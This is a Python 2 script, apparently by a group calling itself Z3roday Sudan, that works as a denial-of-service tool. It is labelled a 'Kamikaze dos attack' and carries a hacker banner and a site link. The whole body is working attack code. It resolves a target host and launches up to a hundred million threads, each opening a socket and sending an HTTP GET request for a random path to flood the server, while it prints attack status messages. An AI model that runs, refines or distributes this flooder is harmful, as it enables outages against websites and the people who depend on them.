# -*- coding: utf-8 -*-


import random
import socket
import string
import sys
import threading
import time

# colour 
G = "\033[32m"; O = "\033[33m"; B = "\033[36m"; R = "\033[31m"; W = "\033[0m"; P = "\033[35m";

print O+("")
mess = """
        ____                _                             _             
     |___ \              | |                           | |            
  ____ __) |_ __ ___   __| | __ _ _   _   ___ _   _  __| | __ _ _ __  
 |_  /|__ <| '__/ _ \ / _` |/ _` | | | | / __| | | |/ _` |/ _` | '_ \ 
  / / ___) | | | (_) | (_| | (_| | |_| | \__ \ |_| | (_| | (_| | | | |
 /___|____/|_|  \___/ \__,_|\__,_|\__, | |___/\__,_|\__,_|\__,_|_| |_|
                                   __/ |                              
                                  |___/                               
                                                         """

print mess
print "                create  Z3roday Sudan"
print "                script Kamikaze dos attack "
print "  Note :▂▃▄▅▆▇█▓▒░Now you can dos attack random GET░▒▓█▇▆▅▄▃▂"


def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)
mengetik('&_<︻╦̵̵͇̿̿̿̿ vist our site ╤───.......┣▇ https://zeroday-sudan.ml  ▇▇▇▇▇═─ ')




host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print "\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
    sys.exit(1)


try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print " ERROR\n Make sure you entered a correct website"
    sys.exit(2)


thread_num = 0
thread_num_mutex = threading.Lock()



def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#"

    thread_num_mutex.release()



def generate_url_path():
    msg = str(string.letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data



def attack():
    print_status()
    url_path = generate_url_path()


    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:

        dos.connect((ip, port))


        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
    except socket.error, e:
        print "\n [ No connection, server may be down ]: " + str(e)
    finally:

        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)


all_threads = []
for i in xrange(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)


    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  
